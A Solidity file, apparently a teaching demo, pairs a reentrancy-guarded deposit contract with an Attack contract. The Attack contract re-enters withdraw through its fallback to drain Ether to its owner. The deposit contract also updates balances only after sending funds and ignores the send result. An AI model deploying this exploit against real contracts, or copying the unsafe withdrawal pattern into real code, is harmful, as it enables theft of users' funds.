import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/master/contracts/security/ReentrancyGuard.sol";
pragma solidity 0.8.0;

//"SPDX-License-Identifier: UNLICENSED"
pragma solidity ^0.8.0;

contract DepositFunds is ReentrancyGuard{
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant{
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        balances[msg.sender] = 0;
    }

    function getTotalBalance () public view returns(uint256) {
        return address(this).balance;
    }
}

contract Attack {
    DepositFunds public depositFunds;
    address payable owner;
    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
        owner = payable(msg.sender);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Enviar mas valor");
        depositFunds.deposit{value: msg.value}();
        depositFunds.withdraw();
    }

    function getTotalBalance () public view returns(uint256) {
        return address(this).balance;
    }

    function cashOut () public payable{
        uint256 balance =getTotalBalance();
        owner.transfer(balance);
    }

}
